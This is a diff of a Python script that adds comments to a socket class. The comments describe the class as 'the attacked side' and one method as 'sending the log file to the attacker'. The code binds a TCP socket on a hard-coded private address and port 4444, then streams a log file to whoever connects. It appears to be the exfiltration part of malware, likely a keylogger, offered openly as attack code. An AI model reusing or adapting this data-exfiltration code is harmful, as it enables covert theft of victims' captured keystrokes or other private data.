@@ -4,10 +4,12 @@ from time import sleep
 host, port = "10.200.201.39", 4444
 
 
+# This class describe the attacked side
 class transfer:
     mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
+    # starting the socket connection
     def __init__(self, logFile):
         self.mysocket.bind((host, port))
         print(' Server is ready ..')
@@ -19,6 +21,7 @@ class transfer:
         print(' file size : {}'.format(str(self.size)))
         threading.Timer(2, self.send_file).start()
 
+    # sending the log file to the attacker
     def send_file(self):
         with open(self.logFile, 'rb') as file:
             data = file.read(1024)
@@ -29,6 +32,5 @@ class transfer:
                 self.conn.send(data)
 
             print(' File sent successfully.')
-
 
 # Transfer = transfer()
